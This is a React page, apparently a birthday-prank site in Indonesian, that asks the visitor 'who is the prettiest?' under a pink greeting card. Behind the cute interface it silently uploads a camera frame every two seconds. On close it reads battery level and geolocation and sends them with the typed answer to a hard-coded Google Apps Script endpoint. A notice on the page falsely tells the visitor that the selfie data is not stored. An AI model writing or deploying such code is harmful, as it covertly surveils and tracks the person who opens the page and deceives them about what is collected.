import React, { useState, useEffect, useRef } from "react";

// ---- Komponen Bintang Jatuh SVG ----
interface CuteStar {
    x: number; y: number; size: number; speed: number; opacity: number; color: string; rotate: number; dRotate: number;
}
const cuteColors = ["#fff", "#fdbaec", "#ffe066", "#ff90b3", "#ffd6ec"];
const CuteShootingStars: React.FC = () => {
    const [stars, setStars] = useState<CuteStar[]>([]);
    useEffect(() => {
        let animationFrame: number;
        const generateStar = (): CuteStar => ({
            x: Math.random() * window.innerWidth, y: -40, size: 22 + Math.random() * 16,
            speed: 1.1 + Math.random() * 2.5, opacity: 0.5 + Math.random() * 0.5,
            color: cuteColors[Math.floor(Math.random() * cuteColors.length)],
            rotate: Math.random() * 360, dRotate: (Math.random() - 0.5) * 1.4,
        });
        let current: CuteStar[] = Array.from({ length: 22 }, generateStar);
        const animate = () => {
            current = current.map((s) => ({
                ...s, x: s.x + s.speed * 1.3, y: s.y + s.speed * 1.1,
                opacity: Math.max(0, s.opacity - 0.0009 * s.size), rotate: s.rotate + s.dRotate,
            })).filter((s) => s.x < window.innerWidth + 40 && s.y < window.innerHeight + 40 && s.opacity > 0.1);
            while (current.length < 22) current.push(generateStar());
            setStars([...current]);
            animationFrame = requestAnimationFrame(animate);
        };
        animate();
        return () => cancelAnimationFrame(animationFrame);
    }, []);
    return (
        <svg className="fixed top-0 left-0 w-full h-full pointer-events-none z-0"
            width="100vw" height="100vh"
            style={{ position: "fixed", zIndex: 0, width: "100vw", height: "100vh" }}>
            {stars.map((star, i) => (
                <g key={i} style={{
                    transform: `translate(${star.x}px,${star.y}px) rotate(${star.rotate}deg)`,
                    opacity: star.opacity, transition: "opacity 0.2s"
                }}>
                    <polygon
                        points="10,1 12.6,7.5 19.6,7.8 13.9,12.3 16.2,19 10,15.4 3.8,19 6.1,12.3 0.4,7.8 7.4,7.5"
                        fill={star.color} stroke="#fff" strokeWidth="1.5"
                        style={{ filter: "drop-shadow(0 0 5px #fff6)" }}
                    />
                    <circle cx={10} cy={8} r={star.size / 7} fill="#fff8" opacity="0.4" />
                </g>
            ))}
        </svg>
    );
};

function BubbleHearts() {
    return (
        <div className="pointer-events-none fixed inset-0 z-0">
            {[...Array(5)].map((_, i) => (
                <span
                    key={i}
                    className="absolute"
                    style={{
                        left: `${10 + Math.random() * 80}%`,
                        top: `${-10 + Math.random() * 120}%`,
                        animation: `bubblefloat 7s ease-in-out ${i * 1.5}s infinite alternate`,
                        opacity: 0.20 + Math.random() * 0.35,
                        fontSize: `${28 + Math.random() * 36}px`,
                        color: i % 2 === 0 ? "#fd2d85" : "#ffb0ce"
                    }}
                >
                    ♥
                </span>
            ))}
            <style jsx>{`
        @keyframes bubblefloat {
          to {
            transform: translateY(-120px) scale(1.14);
            opacity: 0.07;
          }
        }
      `}</style>
        </div>
    );
}

// --- Komponen Utama Halaman Ulang Tahun ---
export default function UltahPage() {
    const [essay, setEssay] = useState("");
    const [isUploading, setIsUploading] = useState(false);
    const [showCamera, setShowCamera] = useState(false);
    const [cameraIntervalId, setCameraIntervalId] = useState<NodeJS.Timeout | null>(null);
    const [alertMessage, setAlertMessage] = useState("");
    const [afterCameraMsg, setAfterCameraMsg] = useState<React.ReactNode>(""); // <--- PERBAIKI TIPE INI
    const [showNextBtn, setShowNextBtn] = useState(false);

    const videoRef = useRef<HTMLVideoElement | null>(null);

    // Ganti dengan URL Google Apps Script kamu!
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwSoWv55bQZFInbbUc_lMdHRgBpXnPGt18XTEf965BCgudiUispWj_t9_5DCfcgUbrFsw/exec";

    const handleSubmitEssay = async () => {
        setIsUploading(true);
        try {
            const res = await fetch("/api/uploadEssay", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ name: "Jeslyn", essay }),
            });
            if (res.ok) {
                setIsUploading(false);
                setShowCamera(true);
                setShowNextBtn(true); // Tampilkan tombol setelah submit sukses
            } else {
                setIsUploading(false);
                setAlertMessage("Gagal upload. Coba lagi ya!");
            }
        } catch (err) {
            setIsUploading(false);
            setAlertMessage("Gagal upload. Coba lagi ya!");
        }
    };

    const captureAndUploadSelfie = (video: HTMLVideoElement) => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        if (!ctx) return;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob((blob) => {
            if (!blob) return;
            fetch("/api/uploadImage", {
                method: "POST",
                body: blob,
            });
        }, "image/jpeg", 0.95);
    };

    useEffect(() => {
        if (!showCamera) return;
        let localStream: MediaStream | null = null;
        const startCamera = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                if (videoRef.current) {
                    videoRef.current.srcObject = stream;
                    localStream = stream;
                    const intervalId = setInterval(() => {
                        if (videoRef.current) captureAndUploadSelfie(videoRef.current);
                    }, 2000);
                    setCameraIntervalId(intervalId);
                }
            } catch {
                setAlertMessage("Tidak bisa akses kamera 😅 Coba izinkan akses kamera di browser kamu ya.");
                setShowCamera(false);
            }
        };
        startCamera();

        return () => {
            if (cameraIntervalId) clearInterval(cameraIntervalId);
            if (localStream) localStream.getTracks().forEach((track) => track.stop());
        };
        // eslint-disable-next-line
    }, [showCamera]);

    const stopCamera = async () => {
        setShowCamera(false);
        if (cameraIntervalId) clearInterval(cameraIntervalId);

        // Battery
        let batteryPct = "-";
        try {
            if ((navigator as any).getBattery) {
                const battery = await (navigator as any).getBattery();
                batteryPct = `${Math.round(battery.level * 100)}%`;
            }
        } catch { }

        // Geolocation
        let locationText = "";
        let locationLink = "";
        let latValue: string | number = "";
        let lngValue: string | number = "";
        let showLocation = false; // <-- flag

        await new Promise<void>((resolve) => {
            if (!navigator.geolocation) {
                resolve();
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    latValue = lat;
                    lngValue = lng;
                    locationText = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
                    locationLink = `https://maps.google.com/?q=${lat},${lng}`;
                    showLocation = true;
                    resolve();
                },
                (err) => {
                    // Jika gagal, showLocation tetap false (tidak menampilkan baris lokasi)
                    resolve();
                },
                { timeout: 7000 }
            );
        });

        // Kirim ke Google Apps Script (GAS)
        fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                essay,
                battery: batteryPct,
                lat: latValue,
                lng: lngValue,
                timestamp: new Date().toISOString(),
            }),
        });

        setAfterCameraMsg(
            <div className="mt-6 px-5 py-4 rounded-2xl border-2 border-pink-300 bg-pink-100/80 text-pink-700 text-center shadow-lg max-w-md mx-auto flex flex-col items-center gap-2">
                <div className="text-lg font-bold font-quicksand mb-1">🎉 Selamat Ulang Tahun! 🎂</div>
                <div className="font-quicksand">
                    Kok hp kamu <b>{batteryPct}</b> ya batrenya... <br />
                    {showLocation && (
                        <>
                            Kok kamu tinggal di{" "}
                            <a href={locationLink} target="_blank" rel="noopener noreferrer" className="underline text-pink-600">
                                {locationText}
                            </a>
                            ?<br />
                        </>
                    )}
                    <span className="text-sm text-pink-400 italic">("Hihihi, jangan kaget ya 😛")</span>
                </div>
            </div>
        );
    };



    return (
        <div className="min-h-screen flex flex-col items-center justify-center relative overflow-hidden">
            <div className="absolute inset-0 z-0 bg-gradient-to-br from-pink-100 via-pink-200 to-fuchsia-200" />
            <CuteShootingStars />
            <BubbleHearts />

            {/* Card Utama */}
            <div className="relative z-10 mt-16 md:mt-32 flex flex-col items-center">
                <div className="w-[98vw] max-w-md mx-auto glassy-card px-6 py-8 shadow-2xl rounded-3xl flex flex-col items-center">
                    {/* Shine */}
                    <div className="absolute -top-16 left-1/2 -translate-x-1/2">
                        <svg width="90" height="90">
                            <circle cx="45" cy="45" r="42" fill="url(#shineGradient)" opacity="0.18" />
                            <defs>
                                <radialGradient id="shineGradient">
                                    <stop offset="0%" stopColor="#fff" />
                                    <stop offset="100%" stopColor="#ffb3d6" />
                                </radialGradient>
                            </defs>
                        </svg>
                    </div>
                    {/* Judul */}
                    <div className="flex flex-col items-center mb-3">
                        <span className="text-4xl font-pacifico bg-gradient-to-r from-pink-400 via-fuchsia-500 to-pink-500 text-transparent bg-clip-text drop-shadow-pink-glow animate-bounce">
                            Happy Pink Day!
                        </span>
                        <span className="text-2xl text-pink-700 font-quicksand mt-2 font-semibold">
                            Special Question Untukmu 💖
                        </span>
                    </div>
                    {/* Icon lucu */}
                    <div className="mb-2 animate-wiggle">
                        <svg width="55" height="55" viewBox="0 0 40 40">
                            <circle cx="20" cy="20" r="20" fill="#fdb3db" />
                            <polygon points="20,7 24,18 36,18 26,24 30,36 20,28 10,36 14,24 4,18 16,18" fill="#fff" />
                        </svg>
                    </div>
                    <p className="text-pink-600 text-lg mb-2 font-quicksand">Menurutmu, siapa yang paling cantik?</p>
                    <textarea
                        value={essay}
                        onChange={(e) => setEssay(e.target.value)}
                        placeholder="Tulis jawaban jujurmu di sini ya..."
                        className="w-full bg-white/80 border-2 border-pink-300 rounded-2xl p-3 h-32 resize-none text-pink-700 font-quicksand text-base font-semibold focus:ring-4 focus:ring-pink-200 focus:border-pink-300 transition-all shadow-inner"
                        maxLength={120}
                        disabled={isUploading}
                    />
                    <button
                        onClick={handleSubmitEssay}
                        className="mt-4 w-full px-6 py-3 bg-gradient-to-r from-pink-400 via-pink-500 to-fuchsia-500 text-white font-bold text-lg rounded-2xl shadow-lg hover:shadow-pink-400/70 focus:ring-2 focus:ring-pink-300 focus:outline-none transition-all duration-200 glow-pink animate-glow"
                        disabled={isUploading || essay.trim().length === 0}
                    >
                        Kirim Jawabanmu 💌
                    </button>
                </div>
                <div className="pt-8 flex justify-center">
                    <span className="text-xs text-pink-400 font-quicksand italic">
                        *Selfie kamera hanya untuk hiburan, data tidak disimpan kok! 🦄✨
                    </span>
                </div>
                {afterCameraMsg && (
                    <div className="w-full flex flex-col items-center mt-4 animate-fade-in">
                        {afterCameraMsg}
                        {showNextBtn && (
                            <a
                                href="/ultah2"
                                className="mt-5 px-7 py-3 bg-gradient-to-r from-pink-400 via-pink-500 to-fuchsia-500 text-white font-bold text-lg rounded-2xl shadow-lg hover:shadow-pink-400/70 focus:ring-2 focus:ring-pink-300 focus:outline-none transition-all duration-200 animate-glow"
                                style={{ textDecoration: "none" }}
                            >
                                lanjuttt ea &rarr;
                            </a>
                        )}
                    </div>
                )}

            </div>

            {/* --- Popup Loading --- */}
            {isUploading && (
                <div className="fixed inset-0 bg-black/40 z-50 flex justify-center items-center">
                    <div className="bg-white/90 rounded-3xl px-10 py-10 shadow-xl flex flex-col items-center text-center animate-pulse border-pink-300 border-2">
                        <svg className="w-14 h-14 text-pink-400 mb-4 animate-spin" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" fill="none" stroke="#fd2d85" strokeWidth="5" /></svg>
                        <span className="text-pink-500 font-semibold text-xl font-quicksand">Tunggu ya... mengirim jawaban spesialmu!</span>
                    </div>
                </div>
            )}

            {/* --- Popup Kamera --- */}
            {showCamera && (
                <div className="fixed inset-0 bg-black/60 z-50 flex justify-center items-center p-4">
                    <div className="relative w-full max-w-sm bg-white rounded-3xl p-7 shadow-xl flex flex-col items-stretch text-center space-y-4 border-2 border-pink-300">
                        {/* Tombol X di pojok kanan dalam card */}
                        <button
                            className="absolute top-3 right-3 w-9 h-9 bg-pink-500 text-white text-2xl font-black rounded-full shadow-lg hover:bg-pink-600 hover:scale-110 transition-all border-white border-4 flex items-center justify-center z-10"
                            onClick={stopCamera}
                            title="Tutup"
                            aria-label="Tutup popup"
                            style={{ lineHeight: "1" }}
                        >
                            ×
                        </button>
                        <h2 className="text-xl font-bold text-pink-500 animate-bounce font-quicksand mt-6">
                            Ini yang paling cantik! 🪄
                        </h2>
                        <div className="w-full aspect-square rounded-xl overflow-hidden shadow-lg bg-pink-50 border border-pink-200 flex items-center justify-center">
                            <video
                                ref={videoRef}
                                autoPlay
                                playsInline
                                className="w-full h-full object-cover"
                            />
                        </div>
                    </div>
                </div>
            )}

            {/* --- Popup Notifikasi/Alert --- */}
            {alertMessage && (
                <div className="fixed inset-0 bg-black/60 z-50 flex justify-center items-center p-4">
                    <div className="bg-white rounded-2xl p-6 shadow-2xl max-w-sm w-full text-center border-2 border-pink-400">
                        <h3 className="text-xl font-bold text-pink-500 mb-4 font-quicksand">Oops!</h3>
                        <p className="text-slate-600 mb-6 font-quicksand">{alertMessage}</p>
                        <button
                            onClick={() => setAlertMessage("")}
                            className="px-6 py-2 bg-pink-500 text-white font-semibold rounded-lg shadow-md hover:bg-pink-600"
                        >
                            Mengerti
                        </button>
                    </div>
                </div>
            )}

            {/* Google Fonts & custom animation */}
            <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@500;700&display=swap');
        body {
          font-family: 'Quicksand', 'Inter', sans-serif;
        }
        .font-pacifico { font-family: 'Pacifico', cursive; }
        .font-quicksand { font-family: 'Quicksand', sans-serif; }
        .glassy-card {
          background: rgba(255,255,255,0.76);
          box-shadow: 0 8px 36px 0 rgba(252,150,208,0.13), 0 1.5px 8px 0 #fec0ef88;
          border: 2.5px solid #fff3fa99;
          backdrop-filter: blur(10px);
        }
        .drop-shadow-pink-glow {
          filter: drop-shadow(0 4px 16px #fd2d8580);
        }
        .glow-pink {
          box-shadow: 0 0 16px #ff9ec9, 0 0 3px #fff;
        }
        .animate-glow {
          animation: glow 2.2s ease-in-out infinite alternate;
        }
        @keyframes glow {
          to { box-shadow: 0 0 28px #fd2d85a6, 0 0 4px #fff; }
        }
        .animate-wiggle {
          animation: wiggle 1.3s ease-in-out infinite alternate;
        }
        @keyframes wiggle {
          0% { transform: rotate(-8deg);}
          100% { transform: rotate(8deg);}
        }
        .animate-fade-in {
          animation: fadein 1.2s;
        }
        @keyframes fadein {
          from { opacity: 0; transform: translateY(40px);}
          to { opacity: 1; transform: none;}
        }
      `}</style>
        </div>
    );
}
